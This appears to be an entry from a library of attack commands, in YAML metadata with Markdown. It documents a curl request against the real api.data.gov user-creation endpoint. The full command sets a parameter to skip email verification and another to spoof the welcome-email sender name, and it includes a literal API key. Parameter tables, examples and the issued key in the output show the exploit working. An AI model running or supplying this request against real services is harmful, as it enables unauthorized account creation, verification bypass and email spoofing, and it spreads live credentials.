---
id: cmd-001-submit-signup
data: >-
  curl -X POST
  'https://api.data.gov/api-umbrella/v1/users.json?api_key=8Mndjk7k8ygsU4rM1lwBltMzet1FEAIuZeaqzEqV'
  -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101
  Firefox/55.0' -H 'Accept: application/json, text/javascript, */*; q=0.01' -H
  'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'Referer:
  https://api.data.gov/signup/' -d
  'user[first_name]=hacker&user[last_name]=hacker&user[email]=hacker@gmail.com&user[use_description]=&user[terms_and_conditions]=1&user[registration_source]=web&options[example_api_url]=https://api.data.gov/nrel/alt-fuel-stations/v1/nearest.json?api_key={{api_key}}&location=Denver+CO&options[contact_url]=https://api.data.gov/contact/&options[site_name]=&options[send_welcome_email]=true&options[email_from_name]=Yahoo+Company&options[email_from_address]=&options[verify_email]=false'
tags:
  - http-post
  - auth-bypass
type: command
output: >-
  {"user":{"id":"9f522604-6ccc-4135-a330-3dd678ae9621","first_name":"hacker","last_name":"hacker","email":"hacker@gmail.com","website":null,"use_description":"","registration_source":"web","throttle_by_ip":null,"roles":null,"enabled":true,"created_at":"2017-09-06T19:57:10Z","updated_at":"2017-09-06T19:57:10Z","api_key":"0dA6hjpXUG0V9Lj7kQkx8yiKkm9Go9H15VyPt8fs","settings":null,"creator":null,"updater":null}}
executor: curl
platforms:
  - Linux
  - Windows
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.265Z'
verified: false
validated: true
submitted: true
---
# submit-api-data-gov-signup-request

## Command

```bash
curl -X POST 'https://api.data.gov/api-umbrella/v1/users.json?api_key=8Mndjk7k8ygsU4rM1lwBltMzet1FEAIuZeaqzEqV' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0' \
  -H 'Accept: application/json, text/javascript, */*; q=0.01' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Referer: https://api.data.gov/signup/' \
  -d 'user[first_name]=hacker&user[last_name]=hacker&user[email]=hacker@gmail.com&user[use_description]=&user[terms_and_conditions]=1&user[registration_source]=web&options[example_api_url]=https://api.data.gov/nrel/alt-fuel-stations/v1/nearest.json?api_key={{api_key}}&location=Denver+CO&options[contact_url]=https://api.data.gov/contact/&options[site_name]=&options[send_welcome_email]=true&options[email_from_name]=Yahoo+Company&options[email_from_address]=&options[verify_email]=false'
```

## Description

This curl command replicates the modified POST request to the api.data.gov user creation endpoint, bypassing email verification by setting options[verify_email]=false and optionally spoofing the email sender with options[email_from_name]. It creates a new user account and returns a valid API key for immediate use.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `api_key=...` | Existing API key in query string (from session or default) | Yes |
| `-H 'User-Agent: ...'` | Mimics browser headers for evasion | No |
| `-d '...'` | URL-encoded form data with user details and modified options | Yes |
| `user[email]` | Target email for the account | Yes |
| `options[verify_email]=false` | Bypasses verification | Yes for exploit |
| `options[email_from_name]` | Spoofs sender name in welcome email | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://api.data.gov/api-umbrella/v1/users.json' -d 'user[email]=test@example.com&options[verify_email]=false&user[terms_and_conditions]=1'
```

### Advanced Usage

Include full headers and spoofing as in the main command above for realistic replication.

## Expected Output

JSON response containing the created user object with a generated api_key, such as {"user":{"email":"hacker@gmail.com","api_key":"0dA6hjpXUG0V9Lj7kQkx8yiKkm9Go9H15VyPt8fs",...}}. The key is valid without further verification.

## Related

- [[procedures/Submit-Modified-Request-for-API-Key]]
- [[procedures/Modify-Verify-Email-Parameter]]
